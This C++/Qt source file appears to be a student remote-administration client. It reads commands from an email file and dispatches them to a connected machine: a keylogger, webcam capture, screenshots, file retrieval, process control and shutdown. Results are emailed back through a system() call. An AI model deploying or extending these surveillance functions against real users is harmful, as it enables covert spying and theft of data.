#include "myclass.h"
#include "./ui_myclass.h"

#pragma comment(lib, "Ws2_32.lib")

bool isConnected = false;

MyClass::MyClass(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MyClass)
{
    ui->setupUi(this);
    watcher = new QFileSystemWatcher(this);

    // current application path is the directory "UI"
    QString filePath_1 = "../info/email.json";
    QString filePath_2 = "../../files/result.bin";
    watcher->addPath(filePath_1);
    watcher->addPath(filePath_2);
    // 2) Connect signal → slot
    connect(watcher, &QFileSystemWatcher::fileChanged,
            this, &MyClass::onFileChanged);

    // 3) Đọc lần đầu cân bằng UI
    loadEmail();
}

MyClass::~MyClass()
{
    delete ui;
}

QString MyClass::readBinaryFileToQString(const QString& filePath) {
    QFile file(filePath);
    if (!file.open(QIODevice::ReadOnly)) {
        qWarning() << "Không thể mở file:" << filePath;
        return "";
    }

    // Đọc 8 byte đầu để lấy độ dài chuỗi
    qint64 len = 0;
    if (file.read(reinterpret_cast<char*>(&len), sizeof(len)) != sizeof(len)) {
        qWarning() << "Không đọc được độ dài chuỗi!";
        return "";
    }

    // Đọc nội dung chuỗi
    QByteArray content = file.read(len);
    if (content.size() != len) {
        qWarning() << "Không đọc đủ nội dung chuỗi!";
        return "";
    }

    file.close();
    return QString::fromUtf8(content);
}

void writeResult(std::string result) {
    std::ofstream ff("../../files/result.txt");

    if (!ff) return;

    // write
    if (result.size() > 0) {
        ff << result;
    }
    else
        ff << "NOT FOUND!\n";
    ff.close();
}

void sendResult() {
    QString app_path = QCoreApplication::applicationDirPath();
    std::string path_str = std::filesystem::path(app_path.toStdString()).parent_path().parent_path().string() + "/send_email";
    system(path_str.c_str());
}

void MyClass::loadEmail()
{
    // current application path is the directory "UI"
    //QString test = QCoreApplication::applicationDirPath();
    //QMessageBox::information(nullptr, "App Path", test);
    if (!isConnected) return;

    QString filePath_1 = "../info/email.json";
    QFile f(filePath_1);
    if (!f.open(QIODevice::ReadOnly | QIODevice::Text)) {
        qDebug() << "Didn't see";
    }

    auto raw = f.readAll();
    f.close();

    QJsonParseError err;
    auto doc = QJsonDocument::fromJson(raw, &err);
    if (err.error != QJsonParseError::NoError || !doc.isObject()) {
        qDebug() << "cannot open file";
        return;
    }
    auto obj = doc.object();
    QString subject = obj.value("subject").toString();
    QString body    = obj.value("body").toString();


    // Block signal để khỏi loop
    QSignalBlocker b1(ui->Subject_content);
    ui->Subject_content->setText(subject);
    QSignalBlocker b2(ui->Body_content);
    ui->Body_content->setText(body);

    std::string choice = subject.toStdString();
    std::string input = body.toStdString();
    std::string result = "";
    if (choice == "LIST_APPS") {
        result = client.ListApps();
        writeResult(result);
        sendResult();
    }
    else if (choice == "START_APP") {
        result = client.StartApp(input);
        writeResult(result);
        sendResult();
    }
    else if (choice == "STOP_APP") {
        result = client.StopApp(input);
        writeResult(result);
        sendResult();
    }
    else if (choice == "LIST_PROCESSES") {
        result = client.ListProcesses();
        writeResult(result);
        sendResult();
    }
    else if (choice == "START_PROCESS")  {
        result = client.StartProcess(input);
        writeResult(result);
        sendResult();
    }
    else if (choice == "STOP_PROCESS") {
        result = client.StopProcess(input);
        writeResult(result);
        sendResult();
    }
    else if (choice == "START_KEYLOGGER") {
        result = client.StartKeylogger();
        writeResult(result);
        sendResult();
    }
    else if (choice == "STOP_KEYLOGGER")  {
        result = client.StopKeylogger();
        writeResult(result);
        sendResult();
    }
    else if (choice == "SHUTDOWN_COMPUTER")    {
        result = client.ShutdownComputer();
        writeResult(result);
        sendResult();
    }
    else if (choice == "RESET_COMPUTER")    {
        result = client.ResetComputer();
        writeResult(result);
        sendResult();
    }
    else if (choice == "RETRIEVE_FILE")    {
        result = client.RetrieveFile(input);
        writeResult(result);
        sendResult();
    }
    else if (choice == "START_WEBCAM")    {
        result = client.StartWebcam();
        writeResult(result);
        sendResult();
    }
    else if (choice == "STOP_WEBCAM") {
        result = client.StopWebcam();
        writeResult(result);
        sendResult();
    }
    else if (choice == "SCREENSHOT") {
        result = client.CaptureScreen();
        writeResult(result);
        sendResult();
    }
}


void MyClass::onFileChanged(const QString &path)
{
    qDebug() << "File changed:" << path;

    if (path.endsWith("email.json"))
        loadEmail();

    watcher->addPath(path);
}

void MyClass::on_pushButton_clicked()
{
    if (isConnected) return;

    QString ip = ui->IP_input->text();
    QString port = ui->Port_input->text();

    if (ip.isEmpty() || port.isEmpty()) {
        QMessageBox::warning(this, "Error", "Please give valid IP and Port!");
        return;
    }

    // Tạo Client object và kết nối
    client.SetDestinationIP(ip.toStdString());
    client.SetDestinationPort(port.toStdString());

    client.ConnectToServer();

    if (!client.IsConnected()) {
        QMessageBox::critical(this, "Error", "Could not connect to server!");
        return;
    }

    QMessageBox::information(this, "Success", "Connected to server!");
    isConnected = true;
}



void MyClass::on_pushButton_2_clicked()
{
    if (!isConnected) return;
    client.Disconnect();
    QMessageBox::information(this, "Success", "Disconnect to server!");
    isConnected = false;
}

